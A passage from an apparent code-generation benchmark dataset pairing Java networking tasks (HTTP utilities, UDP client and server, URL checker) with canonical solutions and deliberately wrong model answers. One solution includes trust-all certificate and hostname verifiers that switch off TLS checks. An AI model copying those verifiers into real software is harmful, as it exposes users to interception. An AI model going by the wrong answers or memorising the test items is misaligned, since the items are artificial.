name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\");\n        writeString(os, \"Content-Type: application/octet-stream\\r\\n\\r\\n\");\n        os.write(data);\n        writeString(os, \"\\r\\n\");\n    }\n\n    public void finishMultipart() throws IOException {\n        writeString(os, delimiter + boundary + delimiter + \"\\r\\n\");\n        os.flush();\n    }\n\n    public String getResponse() throws IOException {\n        int responseCode = con.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            return \"HTTP error code: \" + responseCode;\n        }\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        StringBuilder sb = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line).append(\"\\n\");\n        }\n        reader.close();\n        return sb.toString();\n    }\n\n    private void writeParamData(String paramName, String value) throws IOException {\n        writeString(os, delimiter + boundary + \"\\r\\n\");\n        writeString(os, \"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\\r\\n\");\n        writeString(os, value + \"\\r\\n\");\n    }\n\n    private void writeString(OutputStream os, String s) throws IOException {\n        os.write(s.getBytes(StandardCharsets.UTF_8));\n    }\n}\n```"
  },
  {
    "Task_id": 609,
    "Instruction": "Task Description: Implement a UDP client function that sends a message to a server and waits for a response.\n\nFunction Description: The function establishes a UDP connection, sends a predefined message (\"hello world\") to a specified server (localhost on port 9876), waits for a response, prints the server's reply, and then closes the connection. This demonstrates basic UDP client-server communication.\n\nInput: None (The target address and port are hardcoded as \"localhost\" and 9876 respectively)\n\nOutput: None (The function prints the server's response to the console but doesn't return any value)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.DatagramPacket;\n\nprivate void sendWifiInfoToClient() throws Exception {\n    DatagramSocket clientSocket = new DatagramSocket();\n    InetAddress IPAddress = InetAddress.getByName(\"localhost\");\n    byte[] sendData = new byte[1024];\n    byte[] receiveData = new byte[1024];\n    String sentence = \"hello world\";\n    sendData = sentence.getBytes();\n    DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, 9876);\n    clientSocket.send(sendPacket);\n    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n    clientSocket.receive(receivePacket);\n    String modifiedSentence = new String(receivePacket.getData());\n    System.out.println(\"FROM SERVER:\" + modifiedSentence);\n    clientSocket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "```python\nimport socket\n\ndef udp_client():\n    host = \"localhost\"\n    port = 9876\n    message = \"hello world\"\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.sendto(message.encode(), (host, port))\n\n    data, _ = sock.recvfrom(1024)\n    print(data.decode())\n\n    sock.close()\n```"
  },
  {
    "Task_id": 61,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests (GET and POST) using HttpURLConnection, with proper error handling and response processing.\n\nClass Description: HttpUtils is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests, manages connection settings, processes responses, and includes custom error handling for HTTP errors.\n\nAttributes:\n\nError.responseCode: int - The HTTP response code when an error occurs\nError.output: String - The error response body from the server\n\nMethods:\n\npost: post(String request) -> String - Makes a POST request to the specified URL with an empty body\npost: post(String request, String body) -> String - Makes a POST request to the specified URL with the given body\nget: get(String request) -> String - Makes a GET request to the specified URL with default timeout\nget: get(String request, IOUtils.LineRead callback, int timeout) -> String - Makes a GET request to the specified URL with custom timeout and response line callback\nhandleResponse: handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) -> String - Internal method to process the HTTP response\nError.toString: toString() -> String - Returns a string representation of the error including response code and output",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUtils {\n\n    public static String post(String request) throws Exception {\n        return post(request, \"\");\n    }\n\n    public static String post(String request, String body) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Length\", \"\" + Integer.toString(body.getBytes().length));\n            connection.setUseCaches(false);\n            connection.setConnectTimeout(60000);\n            connection.setReadTimeout(60000);\n            DataOutputStream wr = new DataOutputStream(connection.getOutputStream());\n            try {\n                wr.writeBytes(body);\n                wr.flush();\n            } finally {\n                wr.close();\n            }\n            return handleResponse(connection, null);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    public static String get(String request) throws Exception {\n        return get(request, null, 3000);\n    }\n\n    public static String get(String request, IOUtils.LineRead callback, int timeout) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setUseCaches(false);\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            return handleResponse(connection, callback);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    private static String handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) throws Exception {\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            return IOUtils.readAll(connection.getInputStream(), callback);\n        } else {\n            throw new Error(responseCode, IOUtils.readAll(connection.getErrorStream(), callback));\n        }\n    }\n\n    public static class Error extends RuntimeException {\n        public final int responseCode;\n        public final String output;\n\n        public Error(int responseCode, String output) {\n            this.responseCode = responseCode;\n            this.output = output;\n        }\n\n        @Override\n        public String toString() {\n            return \"Error{\" +\n                    \"responseCode=\" + responseCode +\n                    \", output='\" + output + '\\'' +\n                    '}';\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUtils {\n    public static class Error {\n        public final int responseCode;\n        public final String output;\n\n        public Error(int responseCode, String output) {\n            this.responseCode = responseCode;\n            this.output = output;\n        }\n\n        @Override\n        public String toString() {\n            return \"Error{\" +\n                    \"responseCode=\" + responseCode +\n                    \", output='\" + output + '\\'' +\n                    '}';\n        }\n    }\n\n    public interface LineRead {\n        void onLine(String line);\n    }\n\n    private static String handleResponse(HttpURLConnection connection, LineRead callback) throws IOException {\n        BufferedReader reader;\n        if (connection.getResponseCode() >= 400) {\n            reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));\n        } else {\n            reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        }\n\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n            if (callback != null) {\n                callback.onLine(line);\n            }\n        }\n        reader.close();\n        return response.toString();\n    }\n\n    public static String get(String request) throws Error {\n        return get(request, null, 5000);\n    }\n\n    public static String get(String request, LineRead callback, int timeout) throws Error {\n        try {\n            URL url = new URL(request);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(timeout);\n            connection.setReadTimeout(timeout);\n            connection.connect();\n\n            return handleResponse(connection, callback);\n        } catch (IOException e) {\n            throw new Error(-1, e.getMessage());\n        }\n    }\n\n    public static String post(String request) throws Error {\n        return post(request, \"\");\n    }\n\n    public static String post(String request, String body) throws Error {\n        try {\n            URL url = new URL(request);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = body.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n\n            return handleResponse(connection, null);\n        } catch (IOException e) {\n            throw new Error(-1, e.getMessage());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 614,
    "Instruction": "Task Description: Implement a UDP server function that continuously listens for incoming packets, processes the received data by converting it to uppercase, and sends the modified data back to the client.\n\nFunction Description: The function sets up a UDP server that binds to a specific port (9876) and enters an infinite loop to receive incoming packets. Upon receiving a packet, it extracts the data, converts it to uppercase, and sends the modified data back to the client's address and port. The function handles all necessary UDP communication steps including socket creation, packet reception, data processing, and response transmission.\n\nInput: None (The function takes no parameters as it binds to a fixed port and processes incoming UDP packets)\n\nOutput: None (The function does not return any value but prints received messages to the console and sends responses back to clients)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\n\nprivate void receiveServerUdpInfo() throws Exception {\n    DatagramSocket serverSocket = new DatagramSocket(9876);\n    byte[] receiveData = new byte[1024];\n    byte[] sendData = new byte[1024];\n    while(true) {\n        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.receive(receivePacket);\n        String sentence = new String(receivePacket.getData());\n        System.out.println(\"RECEIVED: \" + sentence);\n        InetAddress IPAddress = receivePacket.getAddress();\n        int port = receivePacket.getPort();\n        String capitalizedSentence = sentence.toUpperCase();\n        sendData = capitalizedSentence.getBytes();\n        DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, port);\n        serverSocket.send(sendPacket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "```python\nimport socket\n\ndef udp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.bind(('0.0.0.0', 9876))\n    \n    while True:\n        data, addr = server_socket.recvfrom(1024)\n        print(f\"Received message: {data.decode()}\")\n        modified_data = data.upper()\n        server_socket.sendto(modified_data, addr)\n\nudp_server()\n```"
  },
  {
    "Task_id": 62,
    "Instruction": "Task Description: Create a function to check if a given URL is accessible and usable by sending a HEAD request and verifying the HTTP response code.\n\nFunction Description: The function checks the accessibility of a URL by attempting to establish a connection and sending a HEAD request. It returns true if the URL responds with HTTP OK (status code 200), indicating it's usable, and false otherwise (including invalid URLs or connection failures).\n\nInput: \n- url: String - The URL to be checked for accessibility.\n\nOutput: \n- boolean - Returns true if the URL is accessible (HTTP status code 200), false otherwise.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic static boolean isUrlUsable(String url) {\n    if (CommonUtils.isEmpty(url)) {\n        return false;\n    }\n\n    URL urlTemp = null;\n    HttpURLConnection connt = null;\n    try {\n        urlTemp = new URL(url);\n        connt = (HttpURLConnection) urlTemp.openConnection();\n        connt.setRequestMethod(\"HEAD\");\n        int returnCode = connt.getResponseCode();\n        if (returnCode == HttpURLConnection.HTTP_OK) {\n            return true;\n        }\n    } catch (Exception e) {\n        return false;\n    } finally {\n        connt.disconnect();\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class UrlChecker {\n    public static boolean isUrlAccessible(String url) {\n        try {\n            URL website = new URL(url);\n            HttpURLConnection connection = (HttpURLConnection) website.openConnection();\n            connection.setRequestMethod(\"HEAD\");\n            int responseCode = connection.getResponseCode();\n            return responseCode == 200;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection to make GET requests and handle responses.\n\nClass Description: The HttpClient class provides functionality to send HTTP GET requests to a specified URL and retrieve the response. It handles connection timeouts, sets appropriate request headers, and processes the response stream.\n\nAttributes: None\n\nMethods:\n- request: [Name](String url) -> String - Sends a GET request to the specified URL and returns the response body as a string. Sets connection timeout to 3 seconds, read timeout to 90 seconds, and configures appropriate request headers including content type and character encoding. Returns null if the request fails or response code is not 200.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n\n    public String request(String url) {\n        HttpURLConnection connection = null;\n        BufferedReader reader = null;\n        try {\n            URL getUrl = new URL(url);\n            connection = (HttpURLConnection) getUrl.openConnection();\n            connection.setReadTimeout(90000);\n            connection.setConnectTimeout(3000);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Charset\", \"UTF-8\");\n            \n            if (200 == connection.getResponseCode()) {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n                StringBuilder result = new StringBuilder();\n                String line = null;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                return result.toString();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n    public String request(String url) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setConnectTimeout(3000);\n            con.setReadTimeout(90000);\n            con.setRequestProperty(\"Content-Type\", \"application/json; charset=UTF-8\");\n\n            int responseCode = con.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a class that handles preloading of HTTP content in the background using a thread pool, with support for cancellation and blacklisting of failed URLs.\n\nClass Description: The PreloadTask class is a Runnable implementation that preloads HTTP content from a given URL up to a specified length. It manages connection timeouts, handles failures by blacklisting URLs, and supports task cancellation. The class works with an HttpProxyCacheServer to get proxied URLs and executes tasks through an ExecutorService.\n\nAttributes:\n- mRawUrl: String - The original URL to be preloaded\n- mPosition: int - The position/index of this preload task (optional tracking)\n- mCacheServer: HttpProxyCacheServer - The proxy server used to get cached URLs\n- mIsCanceled: boolean - Flag indicating if the task was canceled\n- mIsExecuted: boolean - Flag indicating if the task was executed\n- blackList: static List<String> - Shared list of URLs that failed to load\n\nMethods:\n- run(): void - The main execution method called by the thread pool, which starts the preload task if not canceled\n- start(): void - Internal method that performs the actual HTTP request and content preloading\n- executeOn(ExecutorService executorService): void - Submits the task to the provided executor service\n- cancel(): void - Cancels the task if it has been executed but not completed",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class PreloadTask implements Runnable {\n\n    public String mRawUrl;\n    public int mPosition;\n    public HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled;\n    private boolean mIsExecuted;\n    private final static List<String> blackList = new ArrayList<>();\n\n    @Override\n    public void run() {\n        if (!mIsCanceled) {\n            start();\n        }\n        mIsExecuted = false;\n        mIsCanceled = false;\n    }\n\n    private void start() {\n        if (blackList.contains(mRawUrl)) return;\n        HttpURLConnection connection = null;\n        try {\n            String proxyUrl = mCacheServer.getProxyUrl(mRawUrl);\n            URL url = new URL(proxyUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(5_000);\n            connection.setReadTimeout(5_000);\n            InputStream in = new BufferedInputStream(connection.getInputStream());\n            int length;\n            int read = -1;\n            byte[] bytes = new byte[8 * 1024];\n            while ((length = in.read(bytes)) != -1) {\n                read += length;\n                if (mIsCanceled || read >= PreloadManager.PRELOAD_LENGTH) {\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        if (mIsExecuted) return;\n        mIsExecuted = true;\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        if (mIsExecuted) {\n            mIsCanceled = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.List;\nimport java.util.concurrent.ExecutorService;\n\npublic class PreloadTask implements Runnable {\n    private final String mRawUrl;\n    private final int mPosition;\n    private final HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled = false;\n    private boolean mIsExecuted = false;\n    private static List<String> blackList;\n\n    public PreloadTask(String rawUrl, int position, HttpProxyCacheServer cacheServer, List<String> blacklist) {\n        mRawUrl = rawUrl;\n        mPosition = position;\n        mCacheServer = cacheServer;\n        blackList = blacklist;\n    }\n\n    @Override\n    public void run() {\n        if (mIsCanceled || mIsExecuted) {\n            return;\n        }\n        mIsExecuted = true;\n        start();\n    }\n\n    private void start() {\n        if (blackList.contains(mRawUrl)) {\n            return;\n        }\n\n        try {\n            URL url = new URL(mCacheServer.getProxyUrl(mRawUrl));\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(10000);\n            connection.connect();\n\n            if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {\n                try (InputStream inputStream = connection.getInputStream()) {\n                    byte[] buffer = new byte[4096];\n                    while (inputStream.read(buffer) != -1 && !mIsCanceled) {\n                        // Simulate preloading by reading the stream\n                    }\n                }\n            } else {\n                blackList.add(mRawUrl);\n            }\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        executorService.execute(this);\n    }\n\n    public void cancel() {\n        mIsCanceled = true;\n    }\n}\n```"
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests with support for both GET and POST methods, handling parameters, headers, and SSL configurations.\n\nClass Description: SimpleHttpUtils is a utility class that provides methods to perform HTTP requests (GET/POST) with configurable parameters, headers, timeouts, and SSL settings. It handles URL encoding, parameter serialization, and response processing.\n\nAttributes:\n- logger: Log - Logger instance for logging messages\n- DEFAULT_CHARSET: String - Default character encoding (utf-8)\n- HTTP_METHOD_POST: String - Constant for POST method\n- HTTP_METHOD_GET: String - Constant for GET method\n- HTTP_ERROR_MESSAGE: String - Key for error messages\n- DEFAULT_READ_TIMEOUT: int - Default read timeout in milliseconds\n- DEFAULT_CONNECT_TIMEOUT: int - Default connection timeout in milliseconds\n- HTTP_PREFIX: String - HTTP URL prefix\n- HTTPS_PREFIX: String - HTTPS URL prefix\n- MAX_FETCHSIZE: int - Maximum fetch size limit\n- trustAnyManagers: TrustManager[] - Array of trust managers for SSL\n\nMethods:\n- httpPost(String url, Map params) -> String - Makes an HTTP POST request to the specified URL with given parameters\n- httpGet(String url, Map params) -> String - Makes an HTTP GET request to the specified URL with given parameters\n- httpRequest(String url, Map<String,String> params, String method, String charSet, Map<String,String> headers) -> String - Makes an HTTP request with configurable method, charset and headers\n- httpRequest(SimpleHttpParam httpParam) -> SimpleHttpResult - Makes an HTTP request with comprehensive configuration options\n- mapToQueryString(Map parameters, String charSet) -> String - Converts a parameter map to a URL-encoded query string\n- urlEncode(String url, String charSet) -> String - URL-encodes a given string\n- setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) -> void - Configures SSL settings for the connection\n- makeStringList(Object value) -> List<String> - Converts an input value to a list of strings\n\nNested Classes:\n- TrustAnyTrustManager: Implements X509TrustManager for custom SSL certificate handling\n- TrustAnyHostnameVerifier: Implements HostnameVerifier for custom hostname verification",
    "Canonical_solution": "import org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.lang.reflect.Array;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLDecoder;\nimport java.net.URLEncoder;\nimport java.nio.charset.Charset;\nimport java.security.KeyStore;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.*;\nimport java.util.Map.Entry;\n\npublic class SimpleHttpUtils {\n    private static final Log logger = LogFactory.getLog(SimpleHttpUtils.class);\n    public static final String DEFAULT_CHARSET = \"utf-8\";\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_ERROR_MESSAGE = \"http_error_message\";\n    public static final int DEFAULT_READ_TIMEOUT = 20000;\n    public static final int DEFAULT_CONNECT_TIMEOUT = 10000;\n    public static final String HTTP_PREFIX = \"http://\";\n    public static final String HTTPS_PREFIX = \"https://\";\n    public static final int MAX_FETCHSIZE = 5000;\n    private static TrustManager[] trustAnyManagers = new TrustManager[]{new TrustAnyTrustManager()};\n\n    static {\n        System.setProperty(\"sun.net.inetaddr.ttl\", \"3600\");\n    }\n\n    public static String httpPost(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpGet(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpRequest(String url, Map<String,String> params, String method,\n                                    String charSet, Map<String,String> headers) {\n        SimpleHttpParam param = new SimpleHttpParam(url);\n        if(null != param){\n            param.setParameters(params);\n        }\n        if(null != headers){\n            param.setHeaders(headers);\n        }\n        param.setCharSet(charSet);\n        param.setMethod(method);\n        SimpleHttpResult result = httpRequest(param);\n        if(result==null || !result.isSuccess()){\n            return null;\n        }else{\n            return result.getContent();\n        }\n    }\n\n    public static SimpleHttpResult httpRequest(SimpleHttpParam httpParam) {\n        String url = httpParam.getUrl();\n        Map<String,Object> parameters = httpParam.getParameters();\n        String sMethod = httpParam.getMethod();\n        String charSet = httpParam.getCharSet();\n        boolean sslVerify = httpParam.isSslVerify();\n        int maxResultSize = httpParam.getMaxResultSize();\n        Map<String,Object> headers = httpParam.getHeaders();\n        int readTimeout = httpParam.getReadTimeout();\n        int connectTimeout = httpParam.getConnectTimeout();\n        boolean ignoreContentIfUnsuccess = httpParam.isIgnoreContentIfUnsuccess();\n        boolean hostnameVerify = httpParam.isHostnameVerify();\n        TrustKeyStore trustKeyStore = httpParam.getTrustKeyStore();\n        ClientKeyStore clientKeyStore = httpParam.getClientKeyStore();\n        \n        if (url == null || url.trim().length() == 0) {\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        if(maxResultSize<=0){\n            throw new IllegalArgumentException(\"maxResultSize must be positive : \"+maxResultSize);\n        }\n        Charset.forName(charSet);\n        HttpURLConnection urlConn = null;\n        URL destURL = null;\n        \n        String baseUrl = url.trim();\n        if (!baseUrl.toLowerCase().startsWith(HTTPS_PREFIX) && !baseUrl.toLowerCase().startsWith(HTTP_PREFIX)) {\n            baseUrl = HTTP_PREFIX + baseUrl;\n        }\n\n        String method = null;\n        if (sMethod != null) {\n            method = sMethod.toUpperCase();\n        }\n        if (method == null\n                || !(method.equals(HTTP_METHOD_POST) || method\n                        .equals(HTTP_METHOD_GET))) {\n            throw new IllegalArgumentException(\"invalid http method : \"\n                    + method);\n        }\n        \n        int index = baseUrl.indexOf(\"?\");\n        if (index>0){\n            baseUrl = urlEncode(baseUrl, charSet);\n        }else if(index==0){\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        \n        String queryString = mapToQueryString(parameters, charSet);\n        String targetUrl = \"\";\n        if (method.equals(HTTP_METHOD_POST)) {\n            targetUrl = baseUrl;\n        } else {\n            if(index>0){\n                targetUrl = baseUrl +\"&\" + queryString;\n            }else{\n                targetUrl = baseUrl +\"?\" + queryString;\n            }\n        }\n        try {\n            destURL = new URL(targetUrl);\n            urlConn = (HttpURLConnection)destURL.openConnection();\n            \n            setSSLSocketFactory(urlConn, sslVerify, hostnameVerify, trustKeyStore, clientKeyStore);\n               \n            \n            boolean hasContentType = false;\n            boolean hasUserAgent = false;\n            for(String key : headers.keySet()){\n                if(\"Content-Type\".equalsIgnoreCase(key)){\n                    hasContentType = true;\n                }\n                if(\"user-agent\".equalsIgnoreCase(key)){\n                    hasUserAgent = true;\n                }\n            }\n            if(!hasContentType){\n                headers.put(\"Content-Type\", \"application/x-www-form-urlencoded; charset=\" + charSet);\n            }\n            if(!hasUserAgent){\n                headers.put(\"user-agent\", \"PlatSystem\");\n            }\n            \n            if(headers!=null && !headers.isEmpty()){\n                for(Entry<String, Object> entry : headers.entrySet()){\n                    String key = entry.getKey();\n                    Object value = entry.getValue();\n                    List<String> values = makeStringList(value);\n                    for(String v : values){\n                        urlConn.addRequestProperty(key, v);\n                    }\n                }\n            }\n            urlConn.setDoOutput(true);\n            urlConn.setDoInput(true);\n            urlConn.setAllowUserInteraction(false);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestMethod(method);\n            urlConn.setConnectTimeout(connectTimeout);\n            urlConn.setReadTimeout(readTimeout);\n            \n            \n            \n            if (method.equals(HTTP_METHOD_POST)) {\n                String postData = queryString.length()==0?httpParam.getPostData():queryString;\n                if(postData!=null && postData.trim().length()>0){\n                    OutputStream os = urlConn.getOutputStream();\n                    OutputStreamWriter osw = new OutputStreamWriter(os, charSet);\n                    osw.write(postData);\n                    osw.flush();\n                    osw.close();\n                }\n            }\n\n            int responseCode = urlConn.getResponseCode();\n            Map<String, List<String>> responseHeaders = urlConn.getHeaderFields();\n            String contentType = urlConn.getContentType();\n                \n            SimpleHttpResult result = new SimpleHttpResult(responseCode);\n            result.setHeaders(responseHeaders);\n            result.setContentType(contentType);\n            \n            if(responseCode!=200 && ignoreContentIfUnsuccess){\n                return result;\n            }\n            \n            InputStream is = urlConn.getInputStream();\n            byte[] temp = new byte[1024];\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            int readBytes = is.read(temp);\n            while(readBytes>0){\n                baos.write(temp, 0, readBytes);\n                readBytes =  is.read(temp);\n            }\n            String resultString = new String(baos.toByteArray(), charSet);\n            baos.close();\n            result.setContent(resultString);\n            return result;\n        } catch (Exception e) {\n            logger.warn(\"connection error : \" + e.getMessage());\n            return new SimpleHttpResult(e);\n        } finally {\n            if (urlConn != null) {\n                urlConn.disconnect();\n            }\n        }\n    }\n\n    private static class TrustAnyTrustManager implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n    }\n    \n    private static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\nimport java.security.KeyStore;\nimport java.security.SecureRandom;\nimport java.util.*;\n\npublic class SimpleHttpUtils {\n    private static final Log logger = LogFactory.getLog(SimpleHttpUtils.class);\n    public static final String DEFAULT_CHARSET = StandardCharsets.UTF_8.name();\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_ERROR_MESSAGE = \"error\";\n    public static final int DEFAULT_READ_TIMEOUT = 5000;\n    public static final int DEFAULT_CONNECT_TIMEOUT = 5000;\n    public static final String HTTP_PREFIX = \"http://\";\n    public static final String HTTPS_PREFIX = \"https://\";\n    public static final int MAX_FETCHSIZE = 1024 * 1024;\n\n    private static TrustManager[] trustAnyManagers = new TrustManager[]{\n            new TrustAnyTrustManager()\n    };\n\n    public static String httpPost(String url, Map<String, Object> params) {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpGet(String url, Map<String, Object> params) {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpRequest(String url, Map<String, String> params, String method, String charSet, Map<String, String> headers) {\n        try {\n            HttpURLConnection urlConn = (HttpURLConnection) new URL(url).openConnection();\n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    urlConn.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            urlConn.setRequestMethod(method);\n            urlConn.setConnectTimeout(DEFAULT_CONNECT_TIMEOUT);\n            urlConn.setReadTimeout(DEFAULT_READ_TIMEOUT);\n            urlConn.setDoOutput(true);\n\n            if (method.equals(HTTP_METHOD_POST)) {\n                if (params != null && !params.isEmpty()) {\n                    OutputStreamWriter writer = new OutputStreamWriter(urlConn.getOutputStream(), charSet);\n                    writer.write(mapToQueryString(params, charSet));\n                    writer.flush();\n                    writer.close();\n                }\n            } else if (method.equals(HTTP_METHOD_GET)) {\n                if (params != null && !params.isEmpty()) {\n                    url += \"?\" + mapToQueryString(params, charSet);\n                }\n            }\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(urlConn.getInputStream(), charSet));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            return response.toString();\n        } catch (Exception e) {\n            logger.error(\"HTTP request error\", e);\n            return \"{\\\"\" + HTTP_ERROR_MESSAGE + 